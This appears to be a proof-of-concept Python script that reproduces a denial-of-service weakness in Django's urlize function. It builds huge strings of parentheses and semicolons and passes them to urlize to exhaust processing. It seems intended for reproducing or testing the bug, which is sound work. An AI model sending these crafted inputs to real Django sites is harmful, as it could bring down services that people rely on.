import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__),
                                                '<PATH TO DJANGO SRC>')))

# Import the vulnerable Django functions
from django.utils.html import urlize

def test_urlize(url):
    """Test a URL to clickable"""
    print("URL:", url)
    result = urlize(url)
    print("Result:", result)

dosdata = "(" * 100_000 + ":" + ")" * 100_000_000
dosdata2 = "&:" + ";" * 100_000
test_urlize(url=dosdata)